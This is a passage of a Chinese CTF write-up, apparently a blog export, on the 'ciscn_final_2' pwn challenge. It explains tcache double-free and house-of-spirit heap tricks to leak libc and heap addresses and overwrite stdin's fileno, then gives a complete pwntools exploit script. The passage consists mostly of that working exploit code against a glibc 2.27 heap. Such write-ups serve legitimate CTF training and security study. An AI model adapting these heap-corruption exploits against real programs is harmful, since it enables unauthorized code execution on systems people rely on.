class="number">0x91</span>)</span><br></pre></td></tr></table></figure><p>多次释放 chunk0 最后放入 unsortedbin 泄露 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>修改 stdin 的 fileno 为 666 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br></pre></td></tr></table></figure><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(binary=<span class="string">&quot;./ciscn_final_2&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_final_2&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_final_2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">type</span>, num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">heap_base = show(<span class="number">2</span>)-<span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of spirt</span></span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># overwrite chunk0 size to 0x91</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">stdin_fileno = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x70</span></span><br><span class="line">log.info(<span class="string">&quot;stdin_fileno:&quot;</span>+<span class="built_in">hex</span>(stdin_fileno))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/Mira_Hu/article/details/103736917">IO_FILE:2018 HCTF the_end</a></li><li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.13_io_file.html">4.13 利用 _IO_FILE 结构</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file">IO_FILE Related</a></li><li><a href="https://xz.aliyun.com/t/6567">IO file结构在pwn中的妙用</a></li><li><a href="https://bestwing.me/IO_FILE_Pwn.html">IO_FILE Pwn 利用整理</a></li></ul><hr><p>[^1]: 用 fwrite 等这种流 I/O 函数写入写出，数据会先放在缓冲区，并没有真正输入或者输出，需要用 fflush 冲洗流中信息才完成写入写出。避免用 fflush 冲洗就用 setbuf 函数关闭缓冲（pwn 题初始化必备）</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO-FILE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
